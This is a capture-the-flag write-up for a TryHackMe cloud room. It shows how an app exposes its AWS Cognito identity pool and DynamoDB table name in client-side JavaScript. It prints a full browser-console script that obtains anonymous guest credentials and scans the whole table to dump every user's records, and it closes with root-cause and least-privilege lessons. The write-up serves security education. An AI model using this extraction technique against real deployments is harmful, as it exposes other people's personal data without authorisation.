Written By Aryan Giri

**Room:** Complimentary  
**Difficulty:** Easy  
**Category:** Cloud  
**Platform:** TryHackMe

Room Link: https://tryhackme.com/room/hh-complimentary-05e0b604

---

## Scenario

Lambo installed the Byte Lotus Wellness application because it promised a smooth onboarding experience without requiring any account creation. Despite never logging in, the application immediately knew personal information about the user.

The objective of this room is to discover how the application authenticates users, identify the AWS mechanism responsible for issuing credentials, and determine whether those credentials can access data belonging to other guests.

---

# AWS in a Nutshell

AWS (Amazon Web Services) is Amazon's cloud platform that allows organizations to rent cloud infrastructure instead of maintaining their own servers.

Instead of buying hardware, companies can simply use AWS services whenever they need them.

Some common AWS services include:

| Service | Purpose |
|----------|----------|
| EC2 | Virtual Machines |
| S3 | Object/File Storage |
| DynamoDB | NoSQL Database |
| Lambda | Serverless Functions |
| Cognito | Authentication & Temporary Credentials |
| IAM | Identity & Permission Management |
| API Gateway | API Hosting |

This room mainly revolves around **AWS Cognito**, **IAM**, and **DynamoDB**.

---

# Skills Learned

- Client-side JavaScript analysis
- AWS Cognito Identity Pools
- Temporary AWS credentials
- IAM permission misconfigurations
- DynamoDB enumeration
- Cloud security assessment

---

# Requirements

One of the nice things about this room is that **no special tools are required**.

Everything can be completed using nothing more than a modern web browser.

---

# Exploring the Application

We first visit the target application.

```
http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/
```

As soon as the application loads we are presented with the Wellness dashboard.


<img width="1771" height="930" alt="Screenshot 2026-07-30 092430" src="https://github.com/user-attachments/assets/145e76c5-97ea-49d0-a36a-a6bb9c5fa6d9" />


> Browser opening the Wellness application

Nothing immediately appears vulnerable.

However, the room hints strongly suggest that **AWS credentials are somehow being provided automatically.**

---

# Looking for Client-Side Secrets

Since everything happens inside the browser, the next logical step is inspecting the application's JavaScript.

Open:

```
Developer Tools
    → Sources
        → app.js
```

Inside **app.js** we immediately discover something extremely interesting.

<img width="1357" height="913" alt="Screenshot 2026-07-30 092503" src="https://github.com/user-attachments/assets/67cd53e4-8259-409d-9443-c16cb98129b5" />


> app.js exposing AWS configuration

The application exposes several sensitive AWS configuration values.

## Exposed Information

### Cognito Identity Pool

```
us-east-1:836c0949-292d-485b-b532-52d5ca7bb688
```

This tells AWS which Identity Pool should issue temporary credentials.

---

### AWS Region

```
us-east-1
```

---

### DynamoDB Table

```
complimentary-GuestWellnessProfiles
```

The client even reveals the exact DynamoDB table being accessed.

---

# Understanding the Authentication Flow

Instead of asking users to create an account or log in, the application uses **AWS Cognito Identity Pools**.

The JavaScript creates credentials using:

```javascript
AWS.CognitoIdentityCredentials(...)
```

When the page loads:

1. The browser contacts AWS Cognito.
2. Cognito issues temporary guest credentials.
3. Those credentials are automatically attached to AWS SDK requests.
4. The application queries DynamoDB.

This creates a frictionless user experience.

Unfortunately, the IAM permissions assigned to these guest credentials are far too permissive.

---

# Why This Is Dangerous

Temporary credentials are **not inherently insecure**.

The real issue is **what those credentials are allowed to access.**

Instead of restricting users to only their own record, these guest credentials were allowed to enumerate the entire database.

This is an IAM authorization failure rather than an authentication failure.

---

# Enumerating DynamoDB

To verify the permissions, I wrote a small JavaScript script that reuses the exposed Cognito Identity Pool to obtain temporary AWS credentials before scanning the DynamoDB table.

```javascript
// Written By Aryan Giri | giriaryan694-a11y
// Byte Lotus Wellness - Data Extraction Script
// Extracts all user data from the DynamoDB table using the guest ID

AWS.config.region = 'us-east-1';

AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: 'us-east-1:836c0949-292d-485b-b532-52d5ca7bb688',
});

async function extractAllData() {

  try {

    await new Promise((resolve, reject) => {
      AWS.config.credentials.get((err) => {
        if (err) reject(err);
        else resolve();
      });
    });

    const dynamodb = new AWS.DynamoDB.DocumentClient();

    const params = {
      TableName: 'complimentary-GuestWellnessProfiles',
    };

    const result = await dynamodb.scan(params).promise();

    console.log("All User Data");

    result.Items.forEach((item, index) => {

      console.log(`User ${index + 1}`);

      Object.entries(item).forEach(([key, value]) => {
        console.log(`${key}: ${value}`);
      });

    });

    return result.Items;

  }

  catch (error) {

    console.error(error);

  }

}

extractAllData();
```
Paste it in Console :
<img width="1332" height="900" alt="Screenshot 2026-07-30 094501" src="https://github.com/user-attachments/assets/ddfc9f4e-4e87-445a-b9e6-91d8429a0559" />

---

# Finding the Flag

Running the script successfully enumerates every guest record stored inside the DynamoDB table.

Rather than returning only the current user, the application exposes every profile.

Among those records, **User 3** contains the room flag.

The flag has been intentionally hidden in the screenshot to comply with TryHackMe's sharing guidelines.

<img width="1430" height="709" alt="Screenshot 2026-07-30 094356" src="https://github.com/user-attachments/assets/d1a14f3e-7f3f-4fc5-8e0b-9641c03b9d82" />


> DynamoDB output showing multiple guest records with the flag redacted

---

# Root Cause

The vulnerability exists because:

- The application exposes its Cognito Identity Pool publicly.
- Anonymous users automatically receive temporary AWS credentials.
- IAM permissions assigned to guest users are overly permissive.
- Guest credentials are allowed to perform unrestricted DynamoDB reads.

This effectively turns every visitor into a legitimate AWS client capable of accessing data belonging to other users.

---

# Real-World Impact

A similar misconfiguration in production could expose highly sensitive customer information, including:

- User profiles
- Contact lists
- Email addresses
- Phone numbers
- GPS locations
- Wellness or medical information
- API tokens
- Internal identifiers

Although the credentials are temporary, they remain fully valid until expiration and inherit every permission granted by the IAM role.

If the IAM policy allows broad database access, every anonymous visitor effectively gains that same access.

---

# Security Lessons

This room highlights several important cloud security principles:

- Never assume temporary credentials are safe simply because they expire.
- Cognito Identity Pools are public by design; security must come from IAM permissions.
- Guest identities should always follow the Principle of Least Privilege.
- Client-side JavaScript should never be trusted as a security boundary.
- Public applications should only expose the minimum AWS resources required.
- Regular IAM permission reviews can prevent accidental overexposure of cloud resources.

---

# Key Takeaways

- AWS Cognito Identity Pools can issue temporary credentials without requiring user accounts.
- Temporary credentials are only as secure as the IAM role attached to them.
- Public JavaScript frequently reveals cloud architecture details useful during reconnaissance.
- Misconfigured IAM permissions can allow attackers to enumerate cloud resources belonging to other users.
- Cloud penetration testing often begins with simple browser source code analysis rather than complex exploitation.
